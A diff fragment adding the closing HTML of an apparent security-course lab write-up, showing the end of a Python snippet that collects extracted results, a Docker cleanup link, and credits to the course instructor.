+            <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span>
+
+    <span class="n">results</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">result_accumulator</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Of course, the specifics for what we save depends on what we want to extract but the code featured above
+serves as an example.</p>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
